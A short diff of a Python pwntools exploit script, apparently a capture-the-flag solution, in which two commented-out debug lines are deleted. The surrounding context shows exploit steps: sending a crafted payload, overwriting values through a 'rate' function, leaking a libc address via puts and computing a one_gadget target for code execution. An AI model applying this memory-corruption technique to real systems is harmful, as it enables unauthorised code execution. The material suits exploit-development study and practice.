@@ -50,7 +50,6 @@ if __name__ == "__main__" :
     p.sendlineafter("name:",payload)
     for i in range(0,11):
         rate("11",0xbb)
-    #log.info(str(d))
     
     rate("3333"+p32(11),11)
     rate(p64(name),dh(pr))
@@ -61,7 +60,7 @@ if __name__ == "__main__" :
     ex()
     p.recvuntil("Exit")
     p.recvline()
-    #print len(p.recvline())
+    
     leak = u64(p.recvline()[2:-1]+"\x00"*2)
     libc = leak-puts_offset
     one_gadget = libc+one[1]
